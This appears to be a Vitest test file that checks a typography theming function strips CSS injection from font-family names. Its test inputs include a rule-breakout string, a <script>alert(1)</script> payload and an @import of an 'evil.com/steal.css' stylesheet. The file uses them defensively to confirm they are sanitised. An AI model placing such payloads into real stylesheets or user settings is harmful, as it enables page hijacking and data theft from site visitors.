/// <reference types="vitest/globals" />

// ---------------------------------------------------------------------------
// Font family CSS injection prevention
// ---------------------------------------------------------------------------

const baseState = {
  headingFamily: "Arial",
  bodyFamily: "Roboto",
  headingWeight: 700,
  bodyWeight: 400,
  
  baseFontSize: 16,
  lineHeight: 1.5,
  letterSpacing: 0,
  headingLetterSpacing: 0,
  preset: "Custom",
};

describe("applyTypography CSS injection prevention", () => {
  let styleEl: HTMLStyleElement | null;

  beforeEach(() => {
    styleEl = document.getElementById("themal-typography") as HTMLStyleElement | null;
    if (styleEl) styleEl.remove();
  });

  afterEach(() => {
    styleEl = document.getElementById("themal-typography") as HTMLStyleElement | null;
    if (styleEl) styleEl.remove();
  });

  async function getApplyTypography() {
    const mod = await import("../utils/themeUtils");
    return mod.applyTypography;
  }

  it("strips curly braces from font family names, preventing CSS breakout", async () => {
    const applyTypography = await getApplyTypography();
    applyTypography({
      ...baseState,
      headingFamily: 'Inter; } body { background: red } .x {',
    } as any);

    styleEl = document.getElementById("themal-typography") as HTMLStyleElement;
    const css = styleEl?.textContent || "";
    // Braces and semicolons should be stripped, preventing rule breakout
    expect(css).not.toContain("} body");
    expect(css).not.toContain("{ background");
  });

  it("strips semicolons and colons from font family names", async () => {
    const applyTypography = await getApplyTypography();
    applyTypography({
      ...baseState,
      bodyFamily: 'Roboto; color: red',
    } as any);

    styleEl = document.getElementById("themal-typography") as HTMLStyleElement;
    const css = styleEl?.textContent || "";
    // Semicolons and colons stripped, so "color: red" cannot be a valid CSS declaration
    expect(css).not.toContain("; color");
    expect(css).not.toContain("color:");
  });

  it("strips angle brackets from font family names", async () => {
    const applyTypography = await getApplyTypography();
    applyTypography({
      ...baseState,
      headingFamily: 'Inter<script>alert(1)</script>',
    } as any);

    styleEl = document.getElementById("themal-typography") as HTMLStyleElement;
    const css = styleEl?.textContent || "";
    expect(css).not.toContain("<script>");
    expect(css).not.toContain("</script>");
  });

  it("strips @ to prevent @import injection", async () => {
    const applyTypography = await getApplyTypography();
    applyTypography({
      ...baseState,
      bodyFamily: '} @import url("https://evil.com/steal.css"); .x {',
    } as any);

    styleEl = document.getElementById("themal-typography") as HTMLStyleElement;
    const css = styleEl?.textContent || "";
    expect(css).not.toContain("@import");
  });

  it("allows normal font family names through", async () => {
    const applyTypography = await getApplyTypography();
    applyTypography({
      ...baseState,
      headingFamily: "'Playfair Display', serif",
      bodyFamily: "'Inter', sans-serif",
    } as any);

    styleEl = document.getElementById("themal-typography") as HTMLStyleElement;
    const css = styleEl?.textContent || "";
    expect(css).toContain("Playfair Display");
    expect(css).toContain("Inter");
  });
});
